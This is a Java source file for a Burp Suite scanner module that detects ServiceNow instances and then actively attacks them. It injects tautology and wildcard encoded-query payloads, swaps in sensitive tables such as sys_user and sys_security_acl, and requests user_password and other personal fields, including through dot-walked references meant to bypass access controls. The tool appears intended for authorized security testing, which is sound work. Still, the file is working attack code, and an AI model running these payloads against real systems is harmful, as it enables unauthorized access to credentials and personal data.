package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.framework.*;
import com.omnistrike.model.*;

import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.Pattern;

/**
 * MODULE: ServiceNow GlideRecord Injection Scanner
 *
 * This module CANNOT be manually triggered by the user. It is an active module
 * that passively gates on ServiceNow indicators in responses. Only when
 * ServiceNow is confirmed does it fire GlideRecord injection payloads.
 *
 * Flow:
 *   1. Receives request/response via processHttpFlow() during active scanning
 *   2. Checks the RESPONSE body, URL, and headers for ServiceNow indicators
 *   3. If NO SN indicators -> returns empty (zero payloads sent)
 *   4. If SN detected -> reports INFO finding, then injects encoded query payloads
 *   5. Preserves original URL encoding (ServiceNow uses URL-encoded query params with ^ as AND)
 *
 * Stop-scan: Respects ScanState.isCancelled() and Thread.isInterrupted().
 */
public class ServiceNowGlideScanner implements ScanModule {

    private static final String MODULE_ID = "servicenow-glide-scanner";

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;

    // -- ServiceNow detection patterns (passive gate) --------------------------

    // Error messages that confirm ServiceNow / Glide platform — only strong indicators
    // Removed: ServiceNow (brand), sys_id (generic), glide. (Glide.js), ScriptError (JS), Table not found (generic)
    // Tightened: "Invalid encoded query" requires sysparm context, com.glide. requires subpackage
    private static final Pattern SN_ERROR_PATTERN = Pattern.compile(
            "GlideRecord|GlideSystem|GlideAggregate|"
                    + "com\\.glide\\.(?:db|script|processors|ui|sys)|"
                    + "Glide(?:Record|System|Aggregate|Ajax)Exception|"
                    + "sysparm.*Invalid encoded query|sysparm_query.*invalid",
            Pattern.CASE_INSENSITIVE);

    // URL patterns that strongly indicate ServiceNow endpoints
    private static final Pattern SN_URL_PATTERN = Pattern.compile(
            "/api/now/table/|/api/now/stats/|/api/now/cmdb/|"
                    + "sysparm_query=|sysparm_fields=|sysparm_limit=|"
                    + "/nav_to\\.do|\\.service-now\\.com/|instance\\.service-now\\.com",
            Pattern.CASE_INSENSITIVE);

    // Response headers specific to ServiceNow
    // Removed: x-transaction-id (generic tracing), x-total-count (generic pagination)
    private static final Set<String> SN_HEADERS = Set.of(
            "x-is-logged-in");

    // -- Encoded query operators (used for target identification) ---------------

    // GlideRecord encoded query operators
    private static final Set<String> ENCODED_QUERY_OPERATORS = Set.of(
            "LIKE", "STARTSWITH", "ENDSWITH", "IN", "NOTIN",
            "ISEMPTY", "ISNOTEMPTY", "ORDERBY");

    // Parameter names that carry encoded queries
    private static final Set<String> QUERY_PARAM_NAMES = Set.of(
            "sysparm_query", "sysparm_fields", "sysparm_display_value",
            "sysparm_limit", "query", "filter", "encoded_query");

    // -- Phase 2: Sensitive tables to probe ------------------------------------

    private static final String[] SENSITIVE_TABLES = {
            "sys_user", "sys_user_group", "sys_user_role", "sys_user_has_role",
            "sys_properties", "sys_db_object", "sys_dictionary", "sys_script",
            "sys_security_acl", "syslog", "cmdb_ci"
    };

    // -- Phase 3: Sensitive fields to probe ------------------------------------

    private static final String[] SENSITIVE_FIELDS = {
            "user_password", "password_needs_reset", "email", "phone",
            "home_phone", "mobile_phone", "cost_center", "manager", "vip"
    };

    // -- Phase 4: Dot-walked fields for ACL bypass -----------------------------

    // Only truly sensitive dot-walked fields — removed routinely-accessible ones
    // (caller_id.email, opened_by.email, caller_id.phone are typically allowed by ACLs)
    private static final String[] DOT_WALKED_FIELDS = {
            "assigned_to.user_password", "opened_by.user_password",
            "caller_id.user_password", "opened_by.manager.email",
            "assigned_to.manager.name", "caller_id.manager.user_name"
    };

    // -- ScanModule interface --------------------------------------------------

    @Override public String getId() { return MODULE_ID; }
    @Override public String getName() { return "ServiceNow GlideRecord Injection"; }
    @Override public String getDescription() {
        return "Detects ServiceNow instances and tests for GlideRecord encoded query injection, "
                + "table enumeration, field exposure, and ACL bypass via dot-walking. "
                + "Only activates when ServiceNow indicators are detected in responses.";
    }
    @Override public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }
    @Override public boolean isPassive() { return false; } // Active module with passive gate

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        // collaboratorManager not used -- no OOB needed for GlideRecord injection
    }

    @Override public void destroy() {}

    // -- Main entry point ------------------------------------------------------

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        if (requestResponse.response() == null) return Collections.emptyList();

        String url = requestResponse.request().url();
        String urlPath = extractPath(url);

        // PASSIVE GATE: Check response for ServiceNow indicators
        SNDetection detection = detectServiceNow(requestResponse);
        if (detection == null) return Collections.emptyList();

        // ServiceNow confirmed -- report INFO finding
        if (dedup.markIfNew(MODULE_ID, urlPath, "sn-detected")) {
            findingsStore.addFinding(Finding.builder(MODULE_ID,
                            "ServiceNow Instance Detected",
                            Severity.INFO, Confidence.CERTAIN)
                    .url(url)
                    .evidence(detection.evidence)
                    .description("The target application is running ServiceNow. "
                            + "GlideRecord encoded query injection testing will be performed automatically.")
                    .requestResponse(requestResponse)
                    .build());
            api.logging().logToOutput("[SN-Glide] ServiceNow detected: " + url + " | " + detection.evidence);
        }

        // ACTIVE ATTACK: Inject encoded query payloads
        try {
            testGlideInjection(requestResponse, detection, url, urlPath);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }

        return Collections.emptyList();
    }

    // -- ServiceNow Detection (passive gate) -----------------------------------

    private SNDetection detectServiceNow(HttpRequestResponse reqResp) {
        String body = reqResp.response().bodyToString();
        if (body == null) body = "";
        String url = reqResp.request().url();

        // Check 1: Error messages in response body (strongest signal -- standalone)
        if (SN_ERROR_PATTERN.matcher(body).find()) {
            return new SNDetection("ServiceNow error/indicator in response body",
                    extractTableFromUrl(url));
        }

        // Check 2: URL pattern + SN-specific header (require both)
        if (SN_URL_PATTERN.matcher(url).find()) {
            for (var h : reqResp.response().headers()) {
                if (SN_HEADERS.contains(h.name().toLowerCase())) {
                    return new SNDetection(
                            "ServiceNow URL pattern (" + url + ") + header: " + h.name(),
                            extractTableFromUrl(url));
                }
            }
        }

        return null; // No ServiceNow detected -- module stays dormant
    }

    // -- Active GlideRecord Injection Testing ----------------------------------

    private void testGlideInjection(HttpRequestResponse original, SNDetection detection,
                                     String url, String urlPath) throws InterruptedException {
        HttpRequest request = original.request();

        // Find injectable parameter(s) -- prioritize encoded query parameters
        List<InjectableParam> targets = identifyTargets(request);
        if (targets.isEmpty()) return;

        for (InjectableParam target : targets) {
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            if (!dedup.markIfNew(MODULE_ID, urlPath, target.name)) continue;

            api.logging().logToOutput("[SN-Glide] Testing parameter '" + target.name
                    + "' on " + url);

            // Phase 1: Encoded Query Injection (tautology / wildcard)
            testEncodedQueryInjection(original, target, url);

            // Phase 2: Table Enumeration
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            testTableEnumeration(original, target, detection.tableName, url);

            // Phase 3: Field Exposure
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            testFieldExposure(original, target, url);

            // Phase 4: ACL Bypass via Dot-Walking
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            testDotWalkingBypass(original, target, url);
        }
    }

    // -- Phase 1: Encoded Query Injection --------------------------------------

    private void testEncodedQueryInjection(HttpRequestResponse original, InjectableParam target,
                                            String url) throws InterruptedException {
        // Baseline: original response
        String baselineBody = original.response().bodyToString();
        if (baselineBody == null) baselineBody = "";
        int baselineRowCount = countOccurrences(baselineBody, "\"sys_id\"");

        // Tautology: append ^ORsys_idISNOTEMPTY (sys_id is never empty on any record)
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        {
            String tautologyPayload = appendToQuery(target.decodedValue, "^ORsys_idISNOTEMPTY");
            HttpRequestResponse result = sendPayload(original, target, tautologyPayload);
            if (result != null && result.response() != null
                    && result.response().statusCode() < 400
                    && ResponseGuard.isUsableResponse(result)) {

                String resultBody = result.response().bodyToString();
                if (resultBody == null) resultBody = "";
                int resultRowCount = countOccurrences(resultBody, "\"sys_id\"");

                if (resultRowCount > baselineRowCount && resultRowCount >= baselineRowCount + 2
                        && result.response().statusCode() == 200) {
                    findingsStore.addFinding(Finding.builder(MODULE_ID,
                                    "ServiceNow Encoded Query Injection -- Tautology Bypass",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(url).parameter(target.name)
                            .evidence("Injected tautology ^ORsys_idISNOTEMPTY returned " + resultRowCount
                                    + " rows vs baseline " + baselineRowCount + " rows. "
                                    + "Encoded query filter was bypassed.")
                            .payload(tautologyPayload)
                            .requestResponse(result)
                            .build());
                    return; // One confirmed finding per phase
                }
            }
            perHostDelay();
        }

        // Wildcard: append ^ORnameLIKE (LIKE with empty value matches everything)
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        {
            String wildcardPayload = appendToQuery(target.decodedValue, "^ORnameLIKE");
            HttpRequestResponse result = sendPayload(original, target, wildcardPayload);
            if (result != null && result.response() != null
                    && result.response().statusCode() < 400
                    && ResponseGuard.isUsableResponse(result)) {

                String resultBody = result.response().bodyToString();
                if (resultBody == null) resultBody = "";
                int resultRowCount = countOccurrences(resultBody, "\"sys_id\"");

                if (resultRowCount > baselineRowCount && resultRowCount >= baselineRowCount + 2
                        && result.response().statusCode() == 200) {
                    findingsStore.addFinding(Finding.builder(MODULE_ID,
                                    "ServiceNow Encoded Query Injection -- Wildcard Bypass",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(url).parameter(target.name)
                            .evidence("Injected wildcard ^ORnameLIKE returned " + resultRowCount
                                    + " rows vs baseline " + baselineRowCount + " rows. "
                                    + "Empty LIKE operator matches all records.")
                            .payload(wildcardPayload)
                            .requestResponse(result)
                            .build());
                    return;
                }
            }
            perHostDelay();
        }
    }

    // -- Phase 2: Table Enumeration --------------------------------------------

    private void testTableEnumeration(HttpRequestResponse original, InjectableParam target,
                                       String originalTable, String url) throws InterruptedException {
        // Differential probe: two different tables must produce different responses
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

        String urlStr = original.request().url();

        // Only works if URL contains /api/now/table/ pattern
        if (!urlStr.contains("/api/now/table/")) return;

        HttpRequestResponse resultA = sendWithTableSwap(original, "sys_user");
        perHostDelay();
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        HttpRequestResponse resultB = sendWithTableSwap(original, "sys_db_object");
        perHostDelay();

        if (resultA == null || resultA.response() == null
                || resultB == null || resultB.response() == null) return;

        String bodyA = resultA.response().bodyToString();
        String bodyB = resultB.response().bodyToString();
        if (bodyA == null) bodyA = "";
        if (bodyB == null) bodyB = "";

        // If both probes produce identical responses, the table in URL is not injectable
        if (bodyA.equals(bodyB)) {
            api.logging().logToOutput("[SN-Glide] Table enumeration: differential probe failed -- "
                    + "table swap does not influence response. Skipping.");
            return;
        }

        for (String table : SENSITIVE_TABLES) {
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

            HttpRequestResponse result = sendWithTableSwap(original, table);
            if (result == null || result.response() == null) { perHostDelay(); continue; }

            int status = result.response().statusCode();
            if (status >= 400 && status < 500) { perHostDelay(); continue; }
            if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); continue; }

            String body = result.response().bodyToString();
            if (body == null) body = "";

            // Require "result" array in response (SN REST format)
            boolean hasResultArray = body.contains("\"result\"");
            if (status == 200 && body.length() > 50
                    && hasResultArray
                    && !body.toLowerCase().contains("table not found")
                    && !body.toLowerCase().contains("invalid table")) {

                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "ServiceNow Sensitive Table Accessible -- " + table,
                                Severity.MEDIUM, Confidence.FIRM)
                        .url(url).parameter("table (URL path)")
                        .evidence("Query against table '" + table + "' returned data with \"result\" array. "
                                + "Differential probe confirmed table swap influences query results. "
                                + "Response length: " + body.length() + " bytes.")
                        .payload("/api/now/table/" + table)
                        .requestResponse(result)
                        .build());
            }
            perHostDelay();
        }
    }

    // -- Phase 3: Field Exposure -----------------------------------------------

    private void testFieldExposure(HttpRequestResponse original, InjectableParam target,
                                    String url) throws InterruptedException {
        // Baseline: original response
        String baselineBody = original.response().bodyToString();
        if (baselineBody == null) baselineBody = "";
        Set<String> baselineKeys = extractJsonKeys(baselineBody);

        // Build a sysparm_fields value with sensitive fields
        String sensitiveFieldList = String.join(",", SENSITIVE_FIELDS);

        // Check if original request has sysparm_fields -- if so, expand it
        String existingFields = findParamValue(original.request(), "sysparm_fields");
        String injectedFields;
        if (existingFields != null && !existingFields.isEmpty()) {
            injectedFields = existingFields + "," + sensitiveFieldList;
        } else {
            injectedFields = sensitiveFieldList;
        }

        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

        HttpRequestResponse result = sendWithFieldsParam(original, injectedFields);
        if (result == null || result.response() == null) { perHostDelay(); return; }
        if (result.response().statusCode() >= 400 && result.response().statusCode() < 500) { perHostDelay(); return; }
        if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); return; }

        String resultBody = result.response().bodyToString();
        if (resultBody == null) resultBody = "";

        // Check: new JSON keys appeared that match our SENSITIVE_FIELDS list
        Set<String> resultKeys = extractJsonKeys(resultBody);
        Set<String> newKeys = new HashSet<>(resultKeys);
        newKeys.removeAll(baselineKeys);

        // Filter to only count keys that match the sensitive fields we requested
        Set<String> sensitiveFieldSet = Set.of(SENSITIVE_FIELDS);
        Set<String> newSensitiveKeys = new HashSet<>();
        for (String key : newKeys) {
            if (sensitiveFieldSet.contains(key)) {
                newSensitiveKeys.add(key);
            }
        }

        if (newSensitiveKeys.size() >= 2 && result.response().statusCode() == 200) {
            // Only CRITICAL if password field exposed with non-empty value
            boolean hasPassword = newSensitiveKeys.contains("user_password")
                    && resultBody.contains("\"user_password\"")
                    && !resultBody.matches("(?s).*\"user_password\"\\s*:\\s*\"\".*");
            Severity sev = hasPassword ? Severity.CRITICAL : Severity.HIGH;
            findingsStore.addFinding(Finding.builder(MODULE_ID,
                            "ServiceNow Field Exposure -- " + newSensitiveKeys.size() + " Sensitive Fields",
                            sev, Confidence.FIRM)
                    .url(url).parameter("sysparm_fields")
                    .evidence("Injected sysparm_fields with sensitive field names returned "
                            + newSensitiveKeys.size() + " new sensitive fields not in baseline response: "
                            + newSensitiveKeys)
                    .payload(injectedFields)
                    .requestResponse(result)
                    .build());
        }
        perHostDelay();
    }

    // -- Phase 4: ACL Bypass via Dot-Walking -----------------------------------

    private void testDotWalkingBypass(HttpRequestResponse original, InjectableParam target,
                                       String url) throws InterruptedException {
        // Baseline: original response
        String baselineBody = original.response().bodyToString();
        if (baselineBody == null) baselineBody = "";
        Set<String> baselineKeys = extractJsonKeys(baselineBody);

        // Collect baseline keys that contain a dot (dot-walked references already present)
        Set<String> baselineDotKeys = new HashSet<>();
        for (String key : baselineKeys) {
            if (key.contains(".")) baselineDotKeys.add(key);
        }

        // Build sysparm_fields with dot-walked references
        String dotWalkedFieldList = String.join(",", DOT_WALKED_FIELDS);

        // If original request had sysparm_fields, expand it
        String existingFields = findParamValue(original.request(), "sysparm_fields");
        String injectedFields;
        if (existingFields != null && !existingFields.isEmpty()) {
            injectedFields = existingFields + "," + dotWalkedFieldList;
        } else {
            injectedFields = dotWalkedFieldList;
        }

        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

        HttpRequestResponse result = sendWithFieldsParam(original, injectedFields);
        if (result == null || result.response() == null) { perHostDelay(); return; }
        if (result.response().statusCode() >= 400 && result.response().statusCode() < 500) { perHostDelay(); return; }
        if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); return; }

        String resultBody = result.response().bodyToString();
        if (resultBody == null) resultBody = "";

        // Check: new dot-walked keys appeared that match our DOT_WALKED_FIELDS payload
        // Filter out SN's standard reference sub-keys (.display_value, .link, .display_name)
        // Only count keys we explicitly requested to avoid FP from incidental dot-walked expansions
        Set<String> dotWalkedFieldSet = Set.of(DOT_WALKED_FIELDS);
        Set<String> resultKeys = extractJsonKeys(resultBody);
        Set<String> newDotKeys = new HashSet<>();
        for (String key : resultKeys) {
            if (key.contains(".") && !baselineDotKeys.contains(key)
                    && !key.endsWith(".display_value") && !key.endsWith(".link")
                    && !key.endsWith(".display_name")
                    && dotWalkedFieldSet.contains(key)) {
                newDotKeys.add(key);
            }
        }

        // Require 2+ new dot-walked keys to confirm ACL bypass (not just 1)
        if (newDotKeys.size() >= 2 && result.response().statusCode() == 200) {
            // CRITICAL only if password fields exposed with non-empty/non-redacted value
            boolean hasPasswordField = false;
            for (String key : newDotKeys) {
                if (key.toLowerCase().contains("password")) {
                    // Verify value is not empty or redacted (********)
                    String valueCheck = "\"" + key + "\"\\s*:\\s*\"(?!\\s*\"|\\*+\")";
                    if (Pattern.compile(valueCheck).matcher(resultBody).find()) {
                        hasPasswordField = true;
                        break;
                    }
                }
            }
            Severity sev = hasPasswordField ? Severity.CRITICAL : Severity.HIGH;
            findingsStore.addFinding(Finding.builder(MODULE_ID,
                            "ServiceNow ACL Bypass via Dot-Walking -- " + newDotKeys.size() + " Related Fields",
                            sev, Confidence.FIRM)
                    .url(url).parameter("sysparm_fields")
                    .evidence("Injected dot-walked field references returned "
                            + newDotKeys.size() + " new dot-walked keys not in baseline: "
                            + newDotKeys + ". Related table data was exposed through ACL bypass.")
                    .payload(injectedFields)
                    .requestResponse(result)
                    .build());
        }
        perHostDelay();
    }

    // -- Target Identification -------------------------------------------------

    private List<InjectableParam> identifyTargets(HttpRequest request) {
        List<InjectableParam> targets = new ArrayList<>();

        for (var param : request.parameters()) {
            String name = param.name().toLowerCase();
            String value = param.value();
            if (value == null || value.isEmpty()) continue;

            // URL-decode the value for inspection
            String decoded = urlDecode(value);

            // Priority 1: Value contains GlideRecord encoded query operators
            if (containsEncodedQueryOperator(decoded)) {
                targets.add(0, new InjectableParam(param.name(), value, decoded,
                        param.type(), true));
                continue;
            }

            // Priority 2: Parameter name matches known SN query parameter names
            if (QUERY_PARAM_NAMES.contains(name)) {
                targets.add(new InjectableParam(param.name(), value, decoded,
                        param.type(), false));
            }
        }

        return targets;
    }

    /**
     * Checks if a decoded parameter value contains GlideRecord encoded query syntax.
     * Looks for operators like ^, =, LIKE, STARTSWITH, ENDSWITH, IN, NOTIN, etc.
     */
    private boolean containsEncodedQueryOperator(String decoded) {
        if (decoded == null) return false;
        // Encoded queries use ^ as AND separator -- strong indicator
        if (decoded.contains("^") && decoded.contains("=")) return true;
        // Check for named operators
        String upper = decoded.toUpperCase();
        for (String op : ENCODED_QUERY_OPERATORS) {
            if (upper.contains(op)) return true;
        }
        return false;
    }

    // -- HTTP Request Helpers --------------------------------------------------

    /**
     * Send a payload by replacing the target parameter's value.
     * The payload is URL-encoded before injection since ServiceNow uses URL-encoded query params.
     */
    private HttpRequestResponse sendPayload(HttpRequestResponse original, InjectableParam target,
                                             String payload) {
        if (ScanState.isCancelled()) return null;

        try {
            HttpRequest modified;
            switch (target.paramType) {
                case URL:
                    modified = original.request().withUpdatedParameters(
                            HttpParameter.urlParameter(target.name, payload));
                    break;
                case BODY:
                    modified = original.request().withUpdatedParameters(
                            HttpParameter.bodyParameter(target.name, payload));
                    break;
                default:
                    return null;
            }

            HttpRequestResponse result = api.http().sendRequest(modified);
            if (result != null && !ResponseGuard.isUsableResponse(result)) return null;
            return result;
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Send a request with the table name swapped in the URL path.
     * Replaces /api/now/table/ORIGINAL_TABLE with /api/now/table/NEW_TABLE.
     */
    private HttpRequestResponse sendWithTableSwap(HttpRequestResponse original, String newTable) {
        if (ScanState.isCancelled()) return null;

        try {
            String originalUrl = original.request().url();
            // Find and replace the table name in /api/now/table/TABLE_NAME
            java.util.regex.Matcher m = Pattern.compile("/api/now/table/([\\w]+)", Pattern.CASE_INSENSITIVE)
                    .matcher(originalUrl);
            if (!m.find()) return null;

            String newUrl = originalUrl.substring(0, m.start())
                    + "/api/now/table/" + newTable
                    + originalUrl.substring(m.end());

            // Reconstruct the request with the modified URL path
            // Use withPath to update just the path portion, preserving headers/body
            String newPath = extractFullPath(newUrl);
            HttpRequest modified = original.request().withPath(newPath);

            HttpRequestResponse result = api.http().sendRequest(modified);
            if (result != null && !ResponseGuard.isUsableResponse(result)) return null;
            return result;
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Send a request with sysparm_fields parameter added or replaced.
     */
    private HttpRequestResponse sendWithFieldsParam(HttpRequestResponse original, String fields) {
        if (ScanState.isCancelled()) return null;

        try {
            HttpRequest modified = original.request().withUpdatedParameters(
                    HttpParameter.urlParameter("sysparm_fields", fields));

            HttpRequestResponse result = api.http().sendRequest(modified);
            if (result != null && !ResponseGuard.isUsableResponse(result)) return null;
            return result;
        } catch (Exception e) {
            return null;
        }
    }

    // -- Encoded Query Manipulation --------------------------------------------

    /**
     * Appends an encoded query fragment to an existing sysparm_query value.
     * ServiceNow uses ^ as the AND separator in encoded queries.
     * If the value is empty or null, returns the fragment alone.
     */
    private String appendToQuery(String existingValue, String fragment) {
        if (existingValue == null || existingValue.isEmpty()) return fragment;
        // If the existing value doesn't end with ^, the fragment starts with ^, so just concatenate
        if (fragment.startsWith("^")) return existingValue + fragment;
        return existingValue + "^" + fragment;
    }

    // -- Table Name Extraction -------------------------------------------------

    /**
     * Extract table name from ServiceNow REST API URL like /api/now/table/incident.
     */
    private String extractTableFromUrl(String url) {
        java.util.regex.Matcher m = Pattern.compile("/api/now/table/(\\w+)", Pattern.CASE_INSENSITIVE)
                .matcher(url);
        if (m.find()) return m.group(1);
        return null;
    }

    // -- Utility Methods -------------------------------------------------------

    private String urlDecode(String value) {
        if (value == null) return null;
        try {
            return URLDecoder.decode(value, StandardCharsets.UTF_8);
        } catch (Exception e) {
            return value;
        }
    }

    /**
     * Find a parameter value by name in the request.
     */
    private String findParamValue(HttpRequest request, String paramName) {
        for (var param : request.parameters()) {
            if (param.name().equalsIgnoreCase(paramName)) {
                return urlDecode(param.value());
            }
        }
        return null;
    }

    /**
     * Extract all JSON keys from a response body.
     * Matches patterns like "key_name": or "key.name": in JSON.
     */
    private Set<String> extractJsonKeys(String body) {
        Set<String> keys = new HashSet<>();
        java.util.regex.Matcher m = Pattern.compile("\"([\\w.]+)\"\\s*:").matcher(body);
        while (m.find()) keys.add(m.group(1));
        return keys;
    }

    private int countOccurrences(String text, String search) {
        int count = 0, idx = 0;
        while ((idx = text.indexOf(search, idx)) >= 0) { count++; idx += search.length(); }
        return count;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("sn-glide.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    private String extractPath(String url) {
        try {
            int s = url.indexOf("://");
            if (s >= 0) { int q = url.indexOf('?', s + 3); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    /**
     * Extract the full path + query string from a URL (everything after host:port).
     */
    private String extractFullPath(String url) {
        try {
            int schemeEnd = url.indexOf("://");
            if (schemeEnd < 0) return url;
            int pathStart = url.indexOf('/', schemeEnd + 3);
            if (pathStart < 0) return "/";
            return url.substring(pathStart);
        } catch (Exception e) {
            return url;
        }
    }

    // -- Inner classes ---------------------------------------------------------

    private static class SNDetection {
        final String evidence;
        final String tableName;
        SNDetection(String evidence, String tableName) {
            this.evidence = evidence;
            this.tableName = tableName;
        }
    }

    private static class InjectableParam {
        final String name;
        final String originalValue;
        final String decodedValue;
        final HttpParameterType paramType;
        final boolean isEncodedQuery; // true if the value contains encoded query operators

        InjectableParam(String name, String originalValue, String decodedValue,
                         HttpParameterType paramType, boolean isEncodedQuery) {
            this.name = name;
            this.originalValue = originalValue;
            this.decodedValue = decodedValue;
            this.paramType = paramType;
            this.isEncodedQuery = isEncodedQuery;
        }
    }
}
